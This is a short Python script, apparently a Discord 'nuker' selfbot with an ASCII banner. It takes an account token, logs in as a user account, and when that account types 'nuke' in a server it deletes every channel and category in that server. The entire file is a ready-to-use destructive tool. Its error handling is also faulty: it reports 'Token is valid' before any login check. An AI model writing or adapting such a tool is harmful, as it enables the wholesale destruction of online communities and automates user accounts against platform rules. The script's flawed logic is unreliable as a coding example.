  import discord
import asyncio

intents = discord.Intents.default()
intents.typing = False
intents.presences = False

client = discord.Client(intents=intents)


@client.event
async def on_message(message):
    if message.author == client.user:
        if message.content.lower() == 'nuke':
            guild = message.guild

            async def delete_channels():
                tasks = [channel.delete() for channel in guild.channels]
                await asyncio.gather(*tasks)

            async def delete_categories():
                tasks = [category.delete() for category in guild.categories]
                await asyncio.gather(*tasks)

            await asyncio.gather(delete_channels(), delete_categories())

token = input(r'''
  $$\ $$\   $$$$$$$\  $$$$$$$\        $$\   $$\ $$\   $$\ $$\   $$\ $$$$$$$$\ $$$$$$$\  
  $$ \$$ \  $$  __$$\ $$  __$$\       $$$\  $$ |$$ |  $$ |$$ | $$  |$$  _____|$$  __$$\ 
$$$$$$$$$$\ $$ |  $$ |$$ |  $$ |      $$$$\ $$ |$$ |  $$ |$$ |$$  / $$ |      $$ |  $$ |
\_$$  $$   |$$$$$$$  |$$$$$$$  |      $$ $$\$$ |$$ |  $$ |$$$$$  /  $$$$$\    $$$$$$$  |
$$$$$$$$$$\ $$  __$$< $$  __$$<       $$ \$$$$ |$$ |  $$ |$$  $$<   $$  __|   $$  __$$< 
\_$$  $$  _|$$ |  $$ |$$ |  $$ |      $$ |\$$$ |$$ |  $$ |$$ |\$$\  $$ |      $$ |  $$ |
  $$ |$$ |  $$ |  $$ |$$ |  $$ |      $$ | \$$ |\$$$$$$  |$$ | \$$\ $$$$$$$$\ $$ |  $$ |
  \__|\__|  \__|  \__|\__|  \__|      \__|  \__| \______/ \__|  \__|\________|\__|  \__|
                                                                                        
                                                                                        
=>''')

try:
    print("Token is valid.")
    print("Waiting for command...")

except discord.errors.LoginFailure:
        print("Invalid token. Please provide a valid token.")
client.run(token, bot=False)
